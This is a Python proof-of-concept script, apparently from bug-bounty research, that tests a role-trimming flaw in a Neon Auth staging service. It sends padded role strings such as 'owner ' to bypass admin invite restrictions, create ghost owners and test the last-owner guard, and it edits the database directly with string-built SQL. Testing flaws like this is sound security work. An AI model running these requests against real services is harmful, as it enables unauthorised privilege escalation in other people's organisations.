# -*- coding: utf-8 -*-
"""V9c: impact scope of the role-trim bug.
A1: can admin invite role='owner ' (bypass admin invite-role restriction)?
A2: owner updates SELF to 'owner ' -> self-lock? then DB repair
A3: owner updates admin to 'owner ' -> ghost owner visible to API list?
A4: remove-member on 'owner ' member by owner - allowed?
A5: last-owner guard still counts exact 'owner' only?"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
U3 = "libobo1229+na_org3@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.5)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.5)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def mid(org, email):
    r = dbq('SELECT m.id FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
            'WHERE m."organizationId"=%s AND u.email=%s' % ("'" + org + "'", "'" + email + "'"))
    return str(r[0][0]) if r else None


def members(org):
    return dbq('SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
               'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))


def invite_accept(org, email, role, ck_inviter, ck_accepter, tag):
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": email, "role": role}, ck_inviter)
    out("%-44s -> %d %s" % (tag + " invite", st, d[:100]))
    if st != 200:
        return None
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
            'AND status=%s' % ("'" + org + "'", "'" + email + "'", "'pending'"))
    iid = str(r[0][0]) if r else None
    if iid and ck_accepter:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": iid}, ck_accepter)
        out("%-44s -> %d %s" % (tag + " accept", st, d[:100]))
    return iid


def main():
    out("== V9c trim bug impact scope ==")
    fetch_db_uri()
    c1, c2, c3 = auth(U1), auth(U2), auth(U3)
    out("sessions: %s" % [bool(c1), bool(c2), bool(c3)])
    if not all([c1, c2, c3]):
        return
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v9c-org", "slug": "v9c-%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return
    invite_accept(org, U2, "admin", c1, c2, "A0 U2 admin")
    invite_accept(org, U3, "member", c1, c3, "A0b U3 member")

    # A1: admin invites 'owner ' (restriction bypass?)
    invite_accept(org, "libobo1229+v9ca@gmail.com", "owner ", c2, None, "A1 admin->'owner '")
    # A1b: admin invites 'admin ' (allowed role w/ spaces?)
    invite_accept(org, "libobo1229+v9cb@gmail.com", "admin ", c2, None, "A1b admin->'admin '")
    # A1c: admin invites ' member' (leading)
    invite_accept(org, "libobo1229+v9cc@gmail.com", " member", c2, None, "A1c admin->' member'")

    # A3: owner updates admin U2 -> 'owner '
    m2 = mid(org, U2)
    st, d, _ = na("POST", "/neondb/auth/organization/update-member-role",
                  {"organizationId": org, "memberId": m2, "role": "owner "}, c1)
    out("A3 owner U2->'owner '        -> %d %s" % (st, d[:110]))
    out("   members: %s" % members(org))
    # can U2 now act as owner? (invite)
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": "libobo1229+v9cd@gmail.com",
                   "role": "member"}, c2)
    out("   U2('owner ') invite perm  -> %d %s" % (st, d[:110]))

    # A4: owner removes 'owner ' member U2
    st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                  {"organizationId": org, "memberIdOrEmail": m2}, c1)
    out("A4 owner removes 'owner ' U2 -> %d %s" % (st, d[:110]))
    out("   members: %s" % members(org))

    # A5: owner updates SELF -> 'owner ' (self-lock test)
    m1 = mid(org, U1)
    st, d, _ = na("POST", "/neondb/auth/organization/update-member-role",
                  {"organizationId": org, "memberId": m1, "role": "owner "}, c1)
    out("A5 owner self->'owner '      -> %d %s" % (st, d[:110]))
    out("   members: %s" % members(org))
    # still owner? try leave
    st, d, _ = na("POST", "/neondb/auth/organization/delete",
                  {"organizationId": org}, c1)
    out("   U1 delete after self-change -> %d %s" % (st, d[:110]))
    # DB repair U1 back to owner
    dbq('UPDATE neon_auth.member SET role=\'owner\' WHERE id=%s' % ("'" + m1 + "'"))
    out("   db repaired")

    # final: U3 owner? cleanup delete
    rem = dbq('SELECT u.email FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
              'WHERE m."organizationId"=%s AND m.role=\'owner\'' % ("'" + org + "'"))
    out("   exact owners: %s" % rem)
    ck_owner = c1 if rem and rem[0][0] == U1 else (c2 if rem and rem[0][0] == U2 else None)
    if ck_owner:
        st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, ck_owner)
        out("cleanup delete org -> %d" % st)
    else:
        dbq('DELETE FROM neon_auth.organization WHERE id=%s' % ("'" + org + "'"))
        dbq('DELETE FROM neon_auth.member WHERE "organizationId"=%s' % ("'" + org + "'"))
        out("cleanup db direct (no exact owner)")
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("done")


if __name__ == "__main__":
    main()
